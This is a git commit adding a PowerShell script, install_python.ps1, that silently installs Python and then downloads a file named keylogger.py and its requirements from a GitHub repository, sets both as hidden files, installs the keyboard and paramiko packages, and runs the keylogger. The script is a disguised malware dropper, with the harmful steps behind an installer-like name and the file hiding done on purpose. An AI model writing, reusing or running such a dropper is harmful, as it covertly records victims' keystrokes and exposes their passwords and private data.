f8ff01b907dd5ffdb424b838d03fae252688120d
ASL-rgb <80420900+ASL-rgb@users.noreply.github.com>
2022-08-10 18:32:45 +0200

    Add files via upload

---
+++ install_python.ps1
@@ -0,0 +1,20 @@
+﻿Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.9/python-3.9.9.exe" -OutFile "python-3.9.9.exe"
+.\python-3.9.9.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+python -V
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "keylogger.py"
+$HIDE=Get-Item keylogger.py -Force
+$HIDE.Attributes="Hidden"
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/requirements.txt" -OutFile "requirements.txt"
+$HIDE1=Get-Item requirements.txt -Force
+$HIDE1.Attributes="Hidden"
+
+pip3 install keyboard
+pip3 install paramiko
+
+<# Remove-Item requirements.txt #>
+
+python3 .\keylogger.py
